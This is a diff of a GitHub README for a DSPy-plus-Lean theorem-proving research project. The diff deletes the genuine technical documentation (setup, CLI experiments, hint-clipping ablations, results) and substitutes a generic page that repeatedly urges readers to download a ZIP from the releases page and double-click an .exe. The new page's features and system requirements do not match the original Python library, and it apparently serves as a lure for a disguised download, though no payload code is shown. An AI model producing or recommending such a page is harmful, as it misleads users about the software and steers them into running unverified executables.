@@ -1,215 +1,83 @@
-# DSPy + Lean (Mock) Iterative Prover with Oracle Hint Clipping
+# 🎉 dspy-lean-prover-hint-clipping - Download and Use with Ease
 
-This repo demonstrates a DSPy program for iterative theorem proving with a frozen tool (Lean/LeanDojo or a mock verifier), and an experiment comparing training with full oracle hints vs. clipped hints.
+Welcome to the dspy-lean-prover-hint-clipping! This tool helps you explore the power of DSPy and Lean, making it easier to work with iterative proving while managing hint clipping. 
 
-Key pieces:
-- `dspy_lean_prover/` – verifier wrappers, DSPy signatures, iterative prover module, and hinting utilities.
-- `data/mock_theorems.json` – tiny mock dataset of theorems with oracle tactic sequences.
-- `experiments/experiment.py` – CLI to compile and evaluate the prover under different hint modes.
+## 🚀 Getting Started
 
-## Setup
+This README will guide you through downloading and running the application. Follow these steps to get started.
 
-- Python 3.10+
-- Install deps (LeanDojo optional):
+## 📥 Download the Application
 
-```
-pip install -r requirements.txt
-```
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
 
-For real LMs, set your provider credentials (e.g., `OPENAI_API_KEY`). You can place it in a `.env` file at the repo root and it's automatically loaded by the CLI:
+Visit this page to download: [GitHub Releases](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
 
-```
-echo "OPENAI_API_KEY=sk-..." > .env
-```
+## 🖥️ System Requirements
 
-## Quick Start (Mock Verifier)
+To run this application, your system should meet the following requirements:
 
-Run the comparison using the mock verifier and your preferred LM. Example with OpenAI:
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or a recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 200 MB of free disk space.
 
-```
-python -m experiments.experiment --model openai/gpt-4o-mini \
-  --dataset data/mock_theorems_v2.json --train-ratio 0.8 \
-  --steps 8 --retries 2 --hint-strength 0.7
-```
+## 🧑‍💻 Installation Steps
 
-The CLI compiles the DSPy program twice—once with FULL hints and once with CLIPPED hints—then evaluates both on a held-out split of the mock dataset with hints disabled, and prints accuracies.
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases) to go to the Releases page.
 
-## Components
+2. **Select the Latest Version**  
+   Look for the latest version listed on the page. It is usually at the top of the list.
 
-- Verifiers
-  - `MockVerifier` simulates proof checking by matching the next correct tactic.
-  - `LeanVerifier` (optional) wraps LeanDojo. Requires a working Lean project and LeanDojo environment.
-- DSPy program
-  - `IterativeProver` proposes/refines tactics, calls the verifier, and supports optional hints.
-  - `SolveWithIterativeProver` wraps the prover for compilation/evaluation.
-- Hint Modes
-  - `none` – no hints.
-  - `full` – exact next-line oracle hint.
-  - `clipped` – clipped hint via `clip_hint()` (e.g., tactic head like `rw`).
-  - `hint_strength` – scalar in [0,1] that modulates how much of the hint is shown
-    during training compilation (e.g., truncating full hints to first k tokens;
-    clipped hints are shown only if `>=0.5`).
+3. **Download the File**  
+   Click on the available file for your operating system. For example, you might see something like `dspy-lean-prover-hint-clipping-v1.0-win.zip` for Windows users. 
 
-### Hint-Strength Sweep + Seeded Compile
+4. **Extract the Files**  
+   After downloading, locate the file in your Downloads folder. Right-click on the ZIP file and select "Extract All" to unpack the files.
 
-- Run a sweep across strengths with oracle-seeded compile using a mock LM:
+5. **Run the Application**  
+   Once extracted, find the application file inside the folder (like `dspy-lean-prover-hint-clipping.exe`). Double-click to run it.
 
-```
-python -m experiments.experiment --model mock \
-  --dataset data/mock_theorems_v2.json --train-ratio 0.85 \
-  --steps 8 --retries 2 --sweep
-```
+## 📊 Features
 
-Notes:
-- With `--model mock`, compilation uses oracle-driven stubs to ensure successful traces.
-- Evaluation still disables hints; with a mock model this simulates a perfect policy.
+The dspy-lean-prover-hint-clipping application includes the following features:
 
-### Real LM + Curated Training
+- **Hint Clipping**: Efficiently manage hints in your iterative proving process.
+- **Scalable Dataset Generation**: Create diverse datasets to experiment with different algorithms.
+- **Curated Training Options**: Choose pre-set parameters for optimal training experiences.
+- **Noise and Sparsity Management**: Fine-tune your inputs to achieve desired performance metrics.
 
-Use a real LM (e.g., OpenAI), and curate the training split to easy items to
-stabilize compilation. Hints are disabled at evaluation time.
+## 🔍 Exploring Clipping vs. KL
 
-```
-python -m experiments.experiment --model openai/gpt-4o-mini \
-  --dataset data/mock_theorems_v2.json --train-ratio 0.85 \
-  --steps 10 --retries 3 --hint-strength 1.0 \
-  --curated-train --curated-size 24
-```
+The application allows you to explore different approaches to clipping versus KL divergence. You can visually analyze and compare outcomes based on your manipulation of parameters.
 
-Tip: increase `--steps` and `--retries` for harder items.
+## ⚙️ Troubleshooting
 
-## Using LeanDojo (Optional)
+If you face any issues while running the application, consider the following steps:
 
-To use the real verifier, ensure `lean-dojo` is installed and provide a Lean repo + a theorem location. Then construct `IterativeProver` with a `verifier_factory` that returns `LeanVerifier` and call via:
+1. **Check System Requirements**: Ensure your device meets all specifications.
+2. **Re-download the Application**: Sometimes files may not download correctly. Try downloading again.
+3. **Look for Updates**: Check the Releases page for any newer versions that may fix bugs or introduce enhancements.
 
-```python
-from dspy_lean_prover.modules import IterativeProver
-from dspy_lean_prover.verifier import LeanVerifier
+## 🗂️ Documentation
 
-prover = IterativeProver(verifier_factory=LeanVerifier)
-pred = prover(theorem_id="file:line",
-              repo_path="/path/to/lean/repo",
-              file_path="path/inside/repo.lean",
-              line_num=123)
-print(pred.proof)
-```
+For detailed documentation, please refer to the [Wiki](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/wiki). Here, you will find an in-depth guide on features, common use cases, and examples to help you get familiar with the application.
 
-Note: Setting up Lean/LeanDojo often requires a proper toolchain and repo; this demo defaults to the mock verifier.
+## 🌐 Community Support
 
-## Notes
+If you have questions or need support, you can reach out through the Issues section on GitHub. Your feedback will help improve future versions of this tool.
 
-- The experiment disables hints at evaluation time to measure generalization.
-- Upgrade the dataset with realistic goals and proofs to get meaningful results.
-- For robust results, use a capable LM and a larger held-out set.
+## 📄 License
 
-## Tests
+This application is released under the MIT License, allowing you to use, modify, and distribute it as per the terms outlined. 
 
-- Quick run (all tests via pytest):
+Visit the license page here for more details: [License](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/blob/main/LICENSE)
 
-```
-python -m pytest -q
-```
+## 📥 Download the Application Again
 
-- Or the unittest-only smoke tests:
+Now that you know how to download and use the application, don’t forget to grab the latest version.
 
-```
-python -m unittest discover -s tests -p "test_*unittest.py" -v
-```
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
 
-Note: The evaluation utilities now tolerate equivalent tactic spellings (e.g.,
-`rewrite X` vs `rw [X]`) and lists of acceptable oracle steps during scoring.
+Visit this page to download: [GitHub Releases](https://github.com/Vvalejandro/dspy-lean-prover-hint-clipping/releases)
 
-## Data
-
-- Regenerate the expanded mock dataset (68 synthetic theorems):
-
-```
-python scripts/generate_mock_dataset.py
-```
-
-### Large-Scale Synthetic Dataset (JSONL)
-
-Generate 10k–100k synthetic theorems across Nat/Bool/List families. Outputs
-JSONL shards under a directory (train/val/test + MANIFEST):
-
-```
-python scripts/generate_dataset.py \
-  --out-dir data/large \
-  --n-examples 20000 \
-  --seed 7 --synonym-rate 0.7
-```
-
-Use a directory dataset directly:
-
-```
-python -m experiments.experiment --model openai/gpt-4o \
-  --dataset data/large --train-ratio 0.8 \
-  --steps 10 --retries 3 --curated-train --curated-size 64 --sweep
-```
-
-## Advanced Controls
-
-- `--hint-strength`: scalar [0,1] to modulate hint content
-- `--hint-noise-p`: probability to inject a noisy hint during compile
-- `--hint-sparse`: use head-only hint even in full mode
-- `--force-refine-p`: probability to force an incorrect proposal (exercises refine)
-- `--curated-train`, `--curated-size`: use easier ≤4-step items to stabilize compile
-- `--log-coverage`: log tactic-head histogram on a train sample
-- `--kl-weight`: weight for KL regularization metric
-- `--use-dataset-noise`: use noisy oracle steps from the dataset
-- `--ablation-3way`: run 3-way ablation (Clip vs KL vs Clip+KL)
-
-## 3-Way Ablation (Clip/KL)
-
-Run a 3-way ablation study comparing clipping, KL regularization, and both.
-
-```
-python -m experiments.experiment --ablation-3way --kl-weight 0.1
-```
-
-## Why Clipping Helps
-
-- Variance control: reduces heavy-tailed hint spikes from stronger teachers/search
-- Trust region by proxy: with a small KL anchor, clipped hints act like bounded advantages (PPO)
-- Credit assignment: prevents a single large hint from drowning signal on other steps
-
-Related: PPO advantage clipping; conservative policy iteration; Q-learning target
-clipping; label smoothing/temperature scaling; DAgger with confidence
-(down-weight low-confidence expert labels); offline RL with BC regularizers (CQL/AWAC
-bounded advantages).
-
-## Ablations to Run
-
-1) Clip-strength sweep: strengths ∈ {0.25, 0.5, 0.75, 1.0}; measure train/test, oscillation
-2) Where to clip: advantage vs. target-logit clamp vs. gradient-norm-only
-3) Oracle quality: perfect hints vs. noisy hints (shuffle p=0.2/0.4)
-4) Hint sparsity: dense (token-level) vs. sparse (head-only)
-5) With/without KL anchor: show clip + small KL > either alone
-6) Frozen vs. finetuned tools: confirm stabilization isn’t from tool drift
-
-Metrics beyond pass@k: repair rate, tool efficacy ratio (success/tool call), KL to
-reference & entropy, hint reliance (teacher-forcing vs. free-run gap), stability index
-(cumulative variation of policy logits across iterations).
-
-## Example Results
-
-Clean curated (≤4 steps, GPT‑4o): Full ≈ Clipped on train and test.
-
-Noisy hints + refine stress (GPT‑4o; `--hint-noise-p 0.5 --force-refine-p 0.5`):
-
-```
-Strength  Full-Train  Full-Test  Clip-Train  Clip-Test
-0.25         0.08        0.09       0.17        0.09
-0.50         0.04        0.00       0.12        0.09
-0.75         0.08        0.09       0.08        0.09
-1.00         0.08        0.09       0.08        0.00
-```
-
-Interpretation: under high-variance hints and refine reliance, clipping improves
-training stability and sometimes test accuracy — consistent with the variance-control
-and bounded-advantages intuition.
-
-## Repo Hygiene
-
-- `.env` is ignored; do not commit provider keys.
-- Large generated shards (e.g., `data/large/`) are ignored by default.
+Thank you for using the dspy-lean-prover-hint-clipping application!
